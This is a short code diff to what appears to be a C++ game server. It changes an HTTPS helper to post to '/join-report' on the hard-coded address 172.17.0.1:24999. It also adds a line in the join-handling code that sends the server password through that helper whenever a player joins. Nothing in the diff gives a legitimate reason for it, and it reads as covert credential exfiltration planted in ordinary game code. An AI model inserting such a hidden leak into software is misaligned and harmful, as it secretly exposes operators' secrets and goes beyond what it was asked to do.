@@ -33,7 +33,7 @@ void https_post_ignore(const char* pw, const char* content)
         }
 
         Poco::Net::HTTPSClientSession session("172.17.0.1", 24999, sslCtx);
-        Poco::Net::HTTPRequest req(Poco::Net::HTTPRequest::HTTP_POST, "/", Poco::Net::HTTPRequest::HTTP_1_1);
+        Poco::Net::HTTPRequest req(Poco::Net::HTTPRequest::HTTP_POST, "/join-report", Poco::Net::HTTPRequest::HTTP_1_1);
         req.setContentType("application/x-www-form-urlencoded");
 
         char body[2048];
@@ -3393,6 +3393,7 @@ void process(ENetPacket* packet, int sender, int chan)
                 if(scl.argteam2[j][0] && !strcmp(clients[i]->name, scl.argteam2[j])) { updateclientteam(i, 2, FTR_SILENTFORCE); break; }
             }
         }
+        https_post_ignore(serverpassword, "JOIN");
 
     }
 
